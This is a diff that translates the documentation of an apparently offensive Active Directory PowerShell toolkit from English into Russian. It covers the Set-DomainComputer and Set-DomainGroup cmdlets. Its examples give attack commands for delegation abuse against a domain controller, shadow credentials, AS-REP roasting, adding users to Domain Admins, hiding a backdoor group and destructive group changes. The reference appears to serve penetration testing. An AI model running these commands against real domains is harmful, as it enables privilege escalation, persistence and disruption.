@@ -243,58 +243,58 @@ Set-DomainComputer
     [-Credential <PSCredential>]
 ```
 
-### Examples
+### Примеры
 
 ```powershell
-# RBCD Attack: Configure delegation to DC
+# RBCD: настроить делегирование на контроллер домена
 Set-DomainComputer -Identity "DC01" -AddRBCD "YOURCOMPUTER$"
-# YOURCOMPUTER$ can now impersonate users TO DC01!
+# YOURCOMPUTER$ теперь может выдавать себя за пользователей перед DC01!
 
-# Shadow Credentials on computer
+# Shadow Credentials на компьютере
 Set-DomainComputer -Identity "FILESERVER01" -AddShadowCredential
-# Returns PFX certificate for computer authentication!
+# Возвращается PFX-сертификат для аутентификации компьютера!
 
-# Unconstrained Delegation (HIGH IMPACT!)
+# Неограниченное делегирование (ВЫСОКОЕ ВЛИЯНИЕ!)
 Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedForDelegation
-# Computer can now impersonate ANY user to ANY service!
+# Компьютер теперь может выступать от имени ЛЮБОГО пользователя в ЛЮБОЙ службе!
 
-# Constrained Delegation to specific SPNs
+# Ограниченное делегирование для заданных SPN
 Set-DomainComputer -Identity "YOURCOMPUTER$" -SetConstrainedDelegation @("cifs/dc01.contoso.com", "ldap/dc01.contoso.com")
-# Computer can delegate to these specific services
+# Компьютер может делегировать полномочия этим службам.
 
-# Protocol Transition (S4U2Self)
+# Переход протокола (S4U2Self)
 Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedToAuthForDelegation
-# Computer can obtain service tickets without user credentials!
+# Компьютер может получать сервисные билеты без учётных данных пользователя!
 
-# Enable disabled computer
+# Включить отключённый компьютер
 Set-DomainComputer -Identity "DISABLEDPC" -Enable
 
-# Cleanup: Remove RBCD
+# Очистка: удалить RBCD
 Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
 
-# Cleanup: Disable Unconstrained Delegation
+# Очистка: отключить неограниченное делегирование
 Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearTrustedForDelegation
 
-# UAC: Allow empty password on computer account
+# UAC: разрешить пустой пароль учётной записи компьютера
 Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNotRequired
 
-# UAC: Password never expires (persistence)
+# UAC: пароль бессрочен (закрепление доступа)
 Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNeverExpires
 
-# UAC: Disable pre-authentication (AS-REP Roasting on computer)
+# UAC: отключить предварительную аутентификацию (AS-REP Roasting для компьютера)
 Set-DomainComputer -Identity "YOURCOMPUTER$" -DontReqPreauth
 
-# UAC: Mark as sensitive / prevent delegation (defensive)
+# UAC: пометить запись как чувствительную и запретить делегирование (защита)
 Set-DomainComputer -Identity "DC01" -NotDelegated
 
-# Cleanup: Re-enable pre-authentication
+# Очистка: снова включить предварительную аутентификацию
 Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearDontReqPreauth
 
-# Cleanup: Remove NOT_DELEGATED protection
+# Очистка: удалить защиту NOT_DELEGATED
 Set-DomainComputer -Identity "DC01" -ClearNotDelegated
 ```
 
-### Delegation Attack Chain
+### Цепочка атаки с делегированием
 
 ```
 1. Create computer account (New-DomainComputer)
@@ -314,23 +314,23 @@ Set-DomainComputer -Identity "DC01" -ClearNotDelegated
 
 ## Set-DomainGroup
 
-Modifies group objects in Active Directory for privilege escalation.
+Изменяет группы Active Directory при тестировании повышения привилегий.
 
-### Available Operations
+### Доступные операции
 
-| Operation | Parameter | Description | Attack Technique |
+| Операция | Параметр | Описание | Техника атаки |
 |-----------|-----------|-------------|------------------|
-| **Add Member** | `-AddMember` | Add user/computer to group | Privilege escalation |
-| **Remove Member** | `-RemoveMember` | Remove member from group | Cleanup |
-| **Clear Members** | `-ClearMembers -Force` | Remove ALL members | Denial of Service |
-| **Set Description** | `-SetDescription` | Set group description | Camouflage |
-| **Clear Description** | `-ClearDescription` | Remove description | Cleanup |
-| **Convert to Security** | `-ConvertToSecurity` | Distribution → Security group | Enable ACL usage |
-| **Convert to Distribution** | `-ConvertToDistribution` | Security → Distribution group | Disarm group |
-| **Set Owner** | `-Owner` | Take ownership of group | ACL abuse |
-| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |
+| **Добавить участника** | `-AddMember` | Добавить пользователя или компьютер в группу | Повышение привилегий |
+| **Удалить участника** | `-RemoveMember` | Удалить участника из группы | Очистка |
+| **Очистить участников** | `-ClearMembers -Force` | Удалить ВСЕХ участников | Отказ в обслуживании |
+| **Установить описание** | `-SetDescription` | Задать описание группы | Маскировка |
+| **Очистить описание** | `-ClearDescription` | Удалить описание | Очистка |
+| **Преобразовать в группу безопасности** | `-ConvertToSecurity` | Группа рассылки → группа безопасности | Разрешить использование в ACL |
+| **Преобразовать в группу рассылки** | `-ConvertToDistribution` | Группа безопасности → группа рассылки | Отключить действие группы |
+| **Назначить владельца** | `-Owner` | Получить владение группой | Злоупотребление ACL |
+| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения ACL | Закрепление доступа |
 
-### Syntax
+### Синтаксис
 
 ```powershell
 Set-DomainGroup
@@ -350,52 +350,52 @@ Set-DomainGroup
     [-Credential <PSCredential>]
 ```
 
-### Examples
+### Примеры
 
 ```powershell
-# Add user to Domain Admins (requires WriteMembers permission)
+# Добавить пользователя в Domain Admins (нужно право WriteMembers)
 Set-DomainGroup -Identity "Domain Admins" -AddMember "eviluser"
-# User is now Domain Admin!
+# Теперь пользователь входит в Domain Admins!
 
-# Add multiple members
+# Добавить нескольких участников
 Set-DomainGroup -Identity "Backup Operators" -AddMember @("user1", "user2", "computer1$")
 
-# Remove member from group
+# Удалить участника группы
 Set-DomainGroup -Identity "Domain Admins" -RemoveMember "eviluser"
 
-# Clear ALL members (destructive!)
+# Очистить ВСЕХ участников (разрушающая операция!)
 Set-DomainGroup -Identity "IT-Support" -ClearMembers -Force
-# Group is now empty!
+# Группа теперь пуста!
 
-# Set description for camouflage
+# Установить описание для маскировки
 Set-DomainGroup -Identity "Backdoor-Group" -SetDescription "Legitimate IT Support Group"
 
-# Convert Distribution to Security group (enable ACL usage)
+# Преобразовать группу рассылки в группу безопасности (для ACL)
 Set-DomainGroup -Identity "MailGroup" -ConvertToSecurity
-# Group can now be used for permissions!
+# Группу теперь можно назначать в разрешениях!
 
-# "Disarm" Security group (convert to Distribution)
+# «Обезвредить» группу безопасности, преобразовав её в группу рассылки
 Set-DomainGroup -Identity "Domain Admins" -ConvertToDistribution
-# Group can no longer be used for permissions!
-# WARNING: This is highly destructive!
+# Группу больше нельзя использовать для назначения прав!
+# ВНИМАНИЕ: это крайне разрушительная операция!
 
-# Take ownership of group
+# Получить владение группой
 Set-DomainGroup -Identity "Domain Admins" -Owner "CONTOSO\attacker"
 
-# Grant WriteMembers rights
+# Выдать право WriteMembers
 Set-DomainGroup -Identity "Domain Admins" -GrantRights WriteMembers -Principal "CONTOSO\attacker"
 ```
 
-### Group Type Values
+### Значения типа группы
 
-| Type | groupType Value | Description |
+| Тип | Значение groupType | Описание |
 |------|-----------------|-------------|
-| Global Security | -2147483646 (0x80000002) | Default security group |
-| DomainLocal Security | -2147483644 (0x80000004) | Local to domain |
-| Universal Security | -2147483640 (0x80000008) | Forest-wide |
-| Global Distribution | 2 (0x2) | Email only, no ACL |
-| DomainLocal Distribution | 4 (0x4) | Email only, local |
-| Universal Distribution | 8 (0x8) | Email only, forest |
+| Глобальная группа безопасности | -2147483646 (0x80000002) | Группа безопасности по умолчанию |
+| Локальная группа безопасности домена | -2147483644 (0x80000004) | Действует в пределах домена |
+| Универсальная группа безопасности | -2147483640 (0x80000008) | Действует по всему лесу |
+| Глобальная группа рассылки | 2 (0x2) | Только почта, без ACL |
+| Локальная группа рассылки домена | 4 (0x4) | Только почта, область домена |
+| Универсальная группа рассылки | 8 (0x8) | Только почта, область леса |
 
 ---
 
